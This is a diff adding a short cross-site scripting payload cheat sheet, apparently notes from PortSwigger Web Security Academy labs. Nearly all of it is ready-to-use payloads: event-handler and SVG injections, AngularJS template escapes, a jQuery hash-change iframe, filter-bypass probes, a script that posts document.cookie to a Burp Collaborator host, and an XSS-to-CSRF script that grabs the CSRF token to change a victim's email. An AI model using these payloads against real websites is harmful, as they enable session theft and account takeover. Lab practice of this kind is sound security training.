@@ -1,0 +1,59 @@
+Stored XSS Insufficent parsing
+<><img src=1 onerror=alert(1)>
+
+"><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+href=javascript:alert(document.cookie)
+"onmouseover="alert(1)
+'-alert(1)-'
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
+"><svg><animatetransform onbegin=alert(1)>
+&apos;-alert(1)-&apos;
+ 
+Canonical Links:
+?'accesskey='x'onclick='alert(1)
+On Windows: ALT+SHIFT+X
+On MacOS: CTRL+ALT+X
+On Linux: Alt+X
+ 
+:jQuery Sink using Hash Change Event
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+ 
+AngularJS
+{{$on.constructor('alert(1)')()}}
+${alert(1)}
+ 
+Stealing User Cookies
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+ 
+XSS to CSRF
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+ 
+XSS but tags and attributes blocked
+<$$> -> find tags
+<body  $$=1> -> find attributes
+<body onresize=print()>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=[your_payload]" onload=this.style.width='100px'>
+all tags and attributes: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+ 
+Custom XSS Tag
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+ 
